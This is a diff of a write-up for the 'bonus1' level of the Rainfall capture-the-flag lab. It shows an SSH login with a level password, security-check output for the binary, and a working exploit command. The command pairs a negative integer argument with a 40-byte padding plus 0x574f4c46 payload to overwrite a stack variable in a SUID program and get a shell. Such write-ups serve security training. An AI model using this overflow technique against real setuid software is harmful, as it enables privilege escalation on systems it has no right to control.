@@ -1,8 +1,17 @@
 Login as `bonus1`.
 ```shell
-┌──$ [~/42/2021/rainfall/level9]
+┌──$ [~/42/2022/rainfall]
 └─>  ssh 192.168.0.19 -p 4242 -l bonus1
 bonus1@192.168.0.19's password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+  GCC stack protector support:            Enabled
+  Strict user copy checks:                Disabled
+  Restrict /dev/mem access:               Enabled
+  Restrict /dev/kmem access:              Enabled
+  grsecurity / PaX: No GRKERNSEC
+  Kernel Heap Hardening: No KERNHEAP
+ System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
 ```
 A `SUID` executable is located in the home directory.
 ```shell
@@ -68,7 +77,9 @@ ESP     = 0xbffff6b0
 integer = 0xbffff6ec $esp+0x3c
 dst[40] = 0xbffff6c4 $esp+0x14
 ```
-In order to overwite integer value, `av[2]` must have 40 bytes followed by value `0x574f4c46`.
+In order to overwrite integer value, `av[2]` must have 40 bytes followed by value `0x574f4c46`.
+
+Exploit and log on to the next level.
 ```shell
 bonus1@RainFall:~$ /home/user/bonus1/bonus1 -2147483600 $(python -c "import struct; print('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A' + struct.pack('I', 0x574f4c46))")
 $ id
